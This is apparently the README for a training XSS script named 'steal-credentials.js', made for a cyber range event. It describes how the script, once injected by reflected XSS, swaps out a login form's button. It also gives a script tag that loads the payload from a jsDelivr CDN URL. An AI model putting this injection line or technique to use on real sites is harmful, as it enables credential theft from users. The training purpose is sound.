# Introduction

This script is intended for educational purposes only, and was created as supplemental material for a cyber range event. This code does not perform any actual malicious code, and should not be used for malicious purposes.

This is a demo XSS script that can be injected into a vulnerable web application by XSS reflection. The script will grab the login form, delete the original login button, and create a new button with a demo "malicious" script attached to it.

# To use

The script can be referenced from a script tag using jsdelivr CDN:

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/barrcodes/xss/steal-credentials.js"></script>

# To access a specific version

As CDNs should, jsdelivr caches the most recent version of the script. Sometimes you will be pulling an old version of the code, in which case you need to edit the above src path to say `xss@hash/steal-credentials.js` replacing "hash" with a commit hash. For example, the most recent version as of writing this readme is:

https://cdn.jsdelivr.net/gh/barrcodes/xss@6f7ad5044e425514c856432a2adf4f6d61998535/steal-credentials.js
